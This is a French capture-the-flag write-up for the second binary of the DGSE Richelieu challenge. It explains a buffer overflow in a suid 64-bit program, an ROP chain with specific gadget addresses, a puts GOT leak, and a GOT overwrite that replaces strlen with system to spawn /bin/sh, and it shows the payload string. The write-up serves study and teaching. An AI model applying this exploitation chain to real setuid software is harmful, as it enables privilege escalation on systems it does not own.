# Challenge Richelieu DGSE - Wargame #2

Le second binaire est le plus difficile à casser. Vous pouvez le récupérer [ici](./binaries/defi2.bin), si le cœur vous en dit. Il s'agit d'un programme en [suid](https://fr.wikipedia.org/wiki/Setuid#Setuid_et_Setgid_pour_les_ex%C3%A9cutables) comme le précédent.

Lançons le :
```
defi2@AttrapeLeDrapeau:~$ ./prog.bin
************************************************
** Vérification du couple login/mot de passe. **
************************************************
login $ monLogin
pass $ monPass
[-] mot de passe trop petit (moins de 8 caractères)
[-] il n'y a pas de nombre
[-] il n'y a pas de caractère spécial
Pas bon. Il vaudrait mieux utiliser un autre couple login/mot de passe
```
En déboguant le programme, on se rend compte que :
- Le login est lu par un `fgets(buff, 0x3e8, stdin)`. On a donc beaucoup de place pour mettre ce que l'on veut, *fgets* va s’arrêter de lire au moment où il va rencontrer un saut de ligne ou qu'il aura lu au maximum 0x3e8 (1000 en décimal) octets.
- Le mot de passe est lu par un `scanf("%s")`. C'est beaucoup plus contraignant : *scanf* va s’arrêter au moment où il lira un "\n" mais aussi un espace " ", un octet null "\x00", entre autres.
- Il y a un [buffer overflow](https://fr.wikipedia.org/wiki/D%C3%A9passement_de_tampon) lors du scanf (et du fgets aussi) : celui-ci ne vérifie pas la taille lue et ne tronque pas, tant qu'il considère que ce qu'il lit est une chaîne. L'overflow a lieu après le 56ème octet lu.
- L'[ASLR](https://fr.wikipedia.org/wiki/Address_space_layout_randomization) est activé et le programme est en 64bits. On va avoir du mal à dévier le flot d’exécution vers un éventuel shell code.

Un moyen de contourner l'*ASLR en 64 bits* est de réaliser une [Ropchain](https://en.wikipedia.org/wiki/Return-oriented_programming), les adresses du programme en lui même étant fixes, contrairement à celles de la libc, de la stack et de la heap.

La grande complexité de ce challenge tient à la difficulté à trouver des *gadgets intéressants*, notamment en ce qui concerne le contrôle du registre *rdi*. Il y a effectivement un `pop rdi; ret;` à l’adresse 0x400a13 mais il contient un saut de ligne dans son adresse : "0x0a". Il est donc inexploitable. J'en ai trouvé un autre, beaucoup moins évident :
```
0x4005e1:	pop    rdi                      # la partie intéressante
0x4005e2:	and    BYTE PTR [rax+0x0],ah    # il faut que rax contienne un pointeur
                                             # vers une zone mémoire accessible en écriture
                                             # pour ne pas faire planter le programme à cet endroit
0x4005e5:	push   rbp
0x4005e6:	sub    rax,0x602058
0x4005ec:	cmp    rax,0xe
0x4005f0:	mov    rbp,rsp
0x4005f3:	jbe    0x400610                 # si rax est inférieur ou égal à 0xe, on va à l'adresse 0x400610
0x4005f5:	mov    eax,0x0
0x4005fa:	test   rax,rax
0x4005fd:	je     0x400610                 # sinon on va aussi à l'addresse 0x400610
```

À l’adresse 0x400610 on trouve :
```
0x400610:	pop    rbp
0x400611:	ret
```

On peut estimer que ce gadget fait (si rax pointe vers une zone inscriptible):
```
pop rdi;
push rbp;
mov rbp,rsp;
pop rbp;
ret;
```

Le pop rbp et push rbp s'annulent...
On a donc :
```
pop rdi;
mov rbp,rsp;
ret;
```
Formidable ! Pour les autres gadgets, j'ai utilisé :
0x40086b : `pop rbp; ret`
0x400863: `mov    eax,DWORD PTR [rbp-0x14]; add rsp, 0x38; pop rbx; pop rbp; ret;`

J'ai codé [un script python](./scripts/defi2-exploit.py) qui exploite la faille.
- Il va d'abord leaker l’adresse de *puts* contenue dans la [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) : `puts(0x602018)`
- Ensuite il va retourner dans le programme  au moment du *fgets* en modifiant son premier argument : `fgets(0x602000, 0x3e8, stdin)`. Le script enverra alors `"/bin/sh"+"\x00"*24+p64(system)+"\n"`.  Cela va réécrire une partie de la GOT jusqu'à l'adresse de *strlen*.
- Le programme va continuer à s’exécuter et appeler strlen(buff). Or buff contient "/bin/sh" et l'adresse de strlen dans la GOT a été écrasée par celle de system. On obtient donc un shell.

Cette partie aurait aussi bien pu être réalisée en effectuant un [ret2csu](https://www.rootnetsec.com/ropemporium-ret2csu/) ou peut-être même encore un [ret2resolve](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62) pour contourner l'absence apparente de gadget `pop rdi`. Un simple ret2reg aurait pu aussir faire l'affaire, [comme l'a fait Alkeryn](https://github.com/Alkeryn/ctf_richelieu_dgse/blob/master/defi2/exploit.py)

Suite et fin dans la dernière partie : [Wargame #3](./Wargame3.md)
